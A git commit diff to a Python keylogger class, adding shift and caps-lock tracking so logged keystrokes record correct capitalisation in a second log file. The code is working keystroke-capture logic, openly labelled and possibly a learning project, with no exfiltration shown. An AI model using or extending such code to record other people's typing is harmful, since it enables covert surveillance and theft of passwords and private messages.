a8984e04990ab83a8b839368e55726574d916cf1
Amogha-Upadyaya <amoghaupadyaya.official@gmail.com>
2024-07-21 12:56:12 +0530

    Modified keylogger.py such that it considers the state of caps lock and shift keys to determine the log in version2_log.txt

--- keylogger.py
+++ keylogger.py
@@ -8,6 +8,8 @@ class KeyLogger:
         self.log_file_version2 = log_file_version2
         self._setup_logging()
         self.listener = None
+        self.shift_pressed = False
+        self.caps_lock_active = False
 
     def _setup_logging(self):
         logging.basicConfig(
@@ -18,8 +20,13 @@ class KeyLogger:
 
     def on_press(self, key):
         try:
-            logging.info(f'Key {key.char} pressed')
-            write_to_version2_log(self.log_file_version2, key.char)
+            char = key.char
+            if self.caps_lock_active:
+                char = char.upper() if not self.shift_pressed else char.lower()
+            elif self.shift_pressed:
+                char = char.upper()
+            logging.info(f'Key {char} pressed')
+            write_to_version2_log(self.log_file_version2, char)
         except AttributeError:
             logging.info(f'Special key {key} pressed')
             if key == Key.space:
@@ -30,11 +37,17 @@ class KeyLogger:
                 write_to_version2_log(self.log_file_version2, '\t')
             elif key == Key.backspace:
                 write_to_version2_log(self.log_file_version2, 'BACKSPACE')
+            elif key == Key.caps_lock:
+                self.caps_lock_active = not self.caps_lock_active
+            elif key in [Key.shift, Key.shift_r, Key.shift_l]:
+                self.shift_pressed = True
 
     def on_release(self, key):
+        if key in [Key.shift, Key.shift_r, Key.shift_l]:
+            self.shift_pressed = False
         if key == Key.esc:
             return False
-    
+
     def start(self):
         self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
         self.listener.start()
